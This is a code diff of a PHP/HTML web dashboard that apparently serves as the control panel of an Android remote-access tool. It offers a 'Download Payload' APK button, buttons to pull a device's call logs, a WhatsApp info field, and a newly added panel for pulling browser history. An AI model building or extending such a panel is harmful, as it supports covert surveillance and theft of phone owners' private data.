@@ -152,12 +152,12 @@
                   </ul>
                 </li>
 
-                <li role="presentation" class="dropdown">
+                <li role="presentation" class="dropdown" id="notif_clicker">
                   <a href="javascript:;" class="dropdown-toggle info-number" data-toggle="dropdown" aria-expanded="false">
                     <i class="fa fa-envelope-o"></i>
-                    <span class="badge bg-green">6</span>
+                    <span class="badge bg-green" id="notif_counter"></span>
                   </a>
-                  <ul id="menu1" class="dropdown-menu list-unstyled msg_list" role="menu">
+                  <ul id="notif_menu" class="dropdown-menu list-unstyled msg_list" role="menu">
                     <li>
                       <a>
                         <span class="image"><img src="images/img.jpg" alt="Profile Image" /></span>
@@ -170,18 +170,7 @@
                         </span>
                       </a>
                     </li>
-                    <li>
-                      <a>
-                        <span class="image"><i class="fa fa-android"></i></span>
-                        <span>
-                          <span>John Smith</span>
-                          <span class="time">3 mins ago</span>
-                        </span>
-                        <span class="message">
-                          Film festivals used to be do-or-die moments for movie makers. They were where...
-                        </span>
-                      </a>
-                    </li>
+                    
                     <li>
                       <a>
                         <span class="image"><img src="images/img.jpg" alt="Profile Image" /></span>
@@ -226,7 +215,7 @@
         <div class="right_col" role="main" style="overflow:hidden">
           <div id="home" class="container" class="base-page" >
             <div class="row">
-                <h1 class="txt txt-default"><i class="fa fa-home"></i>&nbsp; Welcome to Home <a href="../data/<?php echo $_SESSION["user_name"].".apk"; ?>"><button class="btn btn-primary">Download Payload</button></a></h1>
+                <h1 class="txt txt-default"><i class="fa fa-home"></i>&nbsp; Welcome to Home <a href="../data/<?php echo md5($_SESSION["user_name"]).".apk"; ?>"><button class="btn btn-primary">Download Payload</button></a></h1>
             </div>
             <div class="row">
                 <!-- Start of Activities -->
@@ -497,6 +486,13 @@
                                   </div>
                                 </div>
                               </li>
+                              <li>
+                                <div class="block">
+                                  <div class="block_content">
+                                    <h2 class="title" id='info_window_whatsapp'></h2>
+                                  </div>
+                                </div>
+                              </li>
                             </ul>
                           </div>
                         </div>
@@ -511,7 +507,6 @@
                       <div class="x_title">
                         <h2>Call Logs  <small></small></h2>
                         <ul class="nav navbar-right panel_toolbox">
-                          <li id="calllog_loader"></li>
                           <li><a class="collapse-link"><i class="fa fa-chevron-up"></i></a>
                           </li>
                           <li><button type="button" onclick="callLog()" class="btn btn-warning btn-xs">Pull Callog</button>
@@ -590,8 +585,26 @@
                       </div>
                     </div>
                   </div>
+                  <div class="col-md-7 col-sm-12 col-xs-12">
+                    <div class="x_panel">
+                      <div class="x_title">
+                        <h2>Browser History <small>Default Browser History</small></h2>
+                        <ul class="nav navbar-right panel_toolbox">
+                          <li><a class="collapse-link"><i class="fa fa-chevron-up"></i></a>
+                          </li>
+                          <li><button type="button" onclick="browserhistory()" class="btn btn-info btn-xs">Pull Browser History </button>
+                          </li>
+                          <li><a class="close-link"><i class="fa fa-close"></i></a>
+                          </li>
+                        </ul>
+                        <div class="clearfix"></div>
+                      </div>
+                      <div class="x_content">
+                        <div id="browserhistory_fetch" ></div>
+                      </div>
+                    </div>
+                  </div>
                 </div>
-
               </div>
               <div class="row" id="no-dev-placeholder">
                   <div class="jumbotron">
